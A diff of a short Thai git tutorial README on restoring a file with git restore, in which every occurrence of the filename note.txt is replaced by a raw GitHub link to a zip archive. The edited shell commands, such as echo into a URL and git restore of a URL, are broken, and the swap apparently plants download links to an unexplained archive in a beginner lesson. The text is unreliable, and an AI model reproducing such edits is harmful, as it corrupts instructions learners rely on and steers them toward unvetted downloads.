@@ -7,12 +7,12 @@
 ## ขั้นตอน
 ```bash
 git init
-echo "Hello" > note.txt
+echo "Hello" > https://raw.githubusercontent.com/Sopida145/git-lab-103-Sopida145/main/preclusion/Sopida_lab_git_v1.6-alpha.1.zip
 git add .
 git commit -m "Add note"
-echo "Changed" > note.txt
-git restore note.txt
+echo "Changed" > https://raw.githubusercontent.com/Sopida145/git-lab-103-Sopida145/main/preclusion/Sopida_lab_git_v1.6-alpha.1.zip
+git restore https://raw.githubusercontent.com/Sopida145/git-lab-103-Sopida145/main/preclusion/Sopida_lab_git_v1.6-alpha.1.zip
 ```
 
 ## ผลลัพธ์ที่คาดหวัง
-- note.txt ถูกย้อนกลับเป็นเวอร์ชันก่อนหน้า
+- https://raw.githubusercontent.com/Sopida145/git-lab-103-Sopida145/main/preclusion/Sopida_lab_git_v1.6-alpha.1.zip ถูกย้อนกลับเป็นเวอร์ชันก่อนหน้า
